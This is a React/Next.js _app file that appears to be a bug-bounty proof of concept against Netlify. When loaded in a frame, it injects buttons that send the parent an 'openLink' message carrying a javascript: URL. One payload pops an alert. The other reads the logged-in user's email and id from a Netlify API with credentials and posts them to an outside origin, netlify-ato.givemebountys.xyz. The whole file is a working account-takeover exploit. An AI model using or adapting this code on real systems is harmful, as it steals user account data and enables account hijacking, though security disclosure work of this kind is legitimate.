import { useEffect } from 'react';
import '../css/main.css';

const POC_ORIGIN = 'https://netlify-ato.givemebountys.xyz';

function alertPayload() {
    return 'javascript:alert(document.domain)';
}

function sessionPayload() {
    const body = [
        '(async()=>{',
        'const poc=' + JSON.stringify(POC_ORIGIN) + ';',
        'const out={origin:(opener&&opener.location&&opener.location.origin)||""};',
        'try{',
        'const u=await opener.fetch("/access-control/bb-api/api/v1/user",{credentials:"include"});',
        'const me=await u.json();',
        'out.status=u.status;',
        'out.email=me.email||"";',
        'out.id=me.id||"";',
        'out.confirmed=u.status===200&&!!out.email;',
        'try{',
        'const el=opener.document.documentElement;',
        'el.setAttribute("data-ato-status",String(u.status));',
        'el.setAttribute("data-ato-email",out.email);',
        'el.setAttribute("data-ato-id",out.id);',
        '}catch(e){}',
        'if(opener.opener)opener.opener.postMessage({kind:"netlify-ato-result",result:out},poc);',
        '}catch(e){',
        'out.error=String((e&&e.message)||e).slice(0,180);',
        'out.confirmed=false;',
        'if(opener&&opener.opener)opener.opener.postMessage({kind:"netlify-ato-result",result:out},poc);',
        '}',
        '})()'
    ].join('');
    return 'javascript:void(' + body + ')';
}

function postOpenLink(kind) {
    const data = kind === 'alert' ? alertPayload() : sessionPayload();
    parent.postMessage(JSON.stringify({
        id: 'openlink-poc',
        type: 'openLink',
        data: data
    }), '*');
}

export default function MyApp({ Component, pageProps }) {
    useEffect(() => {
        if (window.parent === window) return undefined;
        if (document.getElementById('openlink-proof-bar')) return undefined;

        const bar = document.createElement('div');
        bar.id = 'openlink-proof-bar';
        bar.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:2147483647;display:flex;gap:12px;justify-content:center;padding:16px;background:#014847;';

        const makeButton = (id, label, kind) => {
            const button = document.createElement('button');
            button.id = id;
            button.type = 'button';
            button.textContent = label;
            button.style.cssText = 'padding:14px 22px;font:700 16px/1.2 Inter,system-ui,sans-serif;color:#014847;background:#fff;border:0;border-radius:8px;cursor:pointer;';
            button.addEventListener('click', () => postOpenLink(kind));
            return button;
        };

        bar.appendChild(makeButton('openlink-alert', 'alert(document.domain)', 'alert'));
        bar.appendChild(makeButton('openlink-ato', 'CLICK HERE', 'ato'));
        document.documentElement.appendChild(bar);
        return undefined;
    }, []);

    return <Component {...pageProps} />;
}
